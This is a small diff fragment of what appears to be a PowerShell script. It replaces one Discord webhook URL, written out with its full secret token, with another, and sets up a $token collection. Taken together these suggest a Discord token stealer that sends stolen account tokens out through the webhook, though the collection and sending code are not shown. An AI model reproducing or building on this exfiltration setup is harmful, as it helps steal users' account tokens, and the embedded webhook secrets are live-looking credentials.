@@ -1,4 +1,4 @@
-$hook  = "https://discord.com/api/webhooks/944098286833401866/du8RBk76wLbymCh_Bbcz1UTokbYuaCjvmehHXP-X9XGMgi2IjgKWsEIwZ7X6sii6y8TO" 
+$hook  = "https://discord.com/api/webhooks/947264658954416159/a2QYX1SZ9cWsCpORJz3GQoTtXgnLor5jOTS2-TBC3CE-_9F0gihwdvJO51neX9FpYEAW" 
 $token = new-object System.Collections.Specialized.StringCollection 
   
   
